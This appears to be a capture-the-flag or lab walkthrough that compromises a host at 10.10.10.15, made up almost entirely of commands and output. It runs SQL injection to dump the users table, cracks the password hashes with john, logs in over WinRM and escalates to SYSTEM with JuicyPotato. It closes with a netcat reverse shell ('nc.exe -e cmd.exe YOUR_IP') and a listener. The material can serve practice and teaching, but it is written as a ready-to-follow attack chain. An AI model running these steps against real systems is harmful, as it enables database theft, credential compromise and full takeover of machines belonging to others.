### Initial Discovery
```
# Web app at http://10.10.10.15/products.php?id=1
# Test for SQL injection
curl "http://10.10.10.15/products.php?id=1'"
# You have an error in your SQL syntax...

# Use SQLi probe
python3 sqli_probe.py -u "http://10.10.10.15/products.php?id=1" --detect
# [!] ERROR-BASED SQLi likely
# [!] BOOLEAN-BASED SQLi likely
```

#### Extract Database Info
```# Determine columns
python3 sqli_probe.py -u "http://10.10.10.15/products.php?id=1" --param id --union
# [*] Finding column count...
# [+] 4 columns, column 2 is reflected

# Get database name
python3 sqli_probe.py -u "http://10.10.10.15/products.php?id=1" --param id --dump-db
# Database: webapp_db
```

#### Extract Tables
```# Dump tables
python3 sqli_probe.py -u "http://10.10.10.15/products.php?id=1" --param id --dump-tables
# Tables: users, products, config

# Dump users table
python3 sqli_probe.py -u "http://10.10.10.15/products.php?id=1" --param id --table users --dump-data
# admin:5f4dcc3b5aa765d61d8327deb882cf99
# website_user:7c6a180b36896a0a8c02787eeafb0e4c
```

#### Crack Password
```
# Save hashes to file
echo "admin:5f4dcc3b5aa765d61d8327deb882cf99" > hashes.txt
echo "website_user:7c6a180b36896a0a8c02787eeafb0e4c" >> hashes.txt

# Crack with john
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
# admin:password
# website_user:letmein
```

#### Access the System
```
# Check for open RDP/WinRM
nmap -p 3389,5985,5986 10.10.10.15
# 5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

# WinRM access
evil-winrm -i 10.10.10.15 -u website_user -p letmein

*Evil-WinRM* PS C:\Users\website_user\Documents> whoami
# target\website_user
```

#### Privilege Escalation
```# Check privileges
whoami /priv
# SeImpersonatePrivilege Enabled

# JuicyPotato exploit
# Upload JuicyPotato
upload /opt/JuicyPotato/JuicyPotato.exe .

# Execute to get SYSTEM
.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami > C:\temp\output.txt" -t *
# Check output
type C:\temp\output.txt
# nt authority\system

# Get SYSTEM shell
.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c nc.exe -e cmd.exe YOUR_IP 4445" -t *

# On attacker
nc -lvnp 4445
# Microsoft Windows [Version 10.0.17763]
# C:\Windows\system32> whoami
# nt authority\system
```

